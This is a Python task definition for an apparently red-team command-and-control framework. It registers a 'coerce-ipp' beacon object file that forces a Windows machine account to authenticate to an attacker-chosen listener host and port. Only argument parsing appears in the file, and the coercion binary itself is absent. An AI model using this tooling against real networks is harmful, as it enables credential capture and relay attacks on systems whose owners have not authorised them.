from typing import List, Tuple

from outflank_stage1.implant.enums import ImplantArch
from outflank_stage1.task.base_bof_task import BaseBOFTask
from outflank_stage1.task.enums import BOFArgumentEncoding
from outflank_stage1.task.validators import validate_port


class CoerceIppBOF(BaseBOFTask):
    def __init__(self):
        super().__init__(
            "coerce-ipp",
            base_binary_name="coerce-ipp",
            base_binary_path="../dist",
            supported_architectures=[ImplantArch.INTEL_X64, ImplantArch.INTEL_X86],
        )

        self.parser.add_argument("host", help="Listener hostname or IP address")
        self.parser.add_argument("port", type=validate_port, help="Listener TCP port (1-65535)")
        self.parser.description = "Coerce machine account authentication via AssocIppDirected"
        self.parser.epilog = "Example: coerce-ipp 127.0.0.1 8082"

    def _encode_arguments_bof(
        self, arguments: List[str]
    ) -> List[Tuple[BOFArgumentEncoding, str | int]]:
        parsed = self.parser.parse_args(arguments)
        return [
            (BOFArgumentEncoding.STR, parsed.host),
            (BOFArgumentEncoding.INT, int(parsed.port)),
        ]
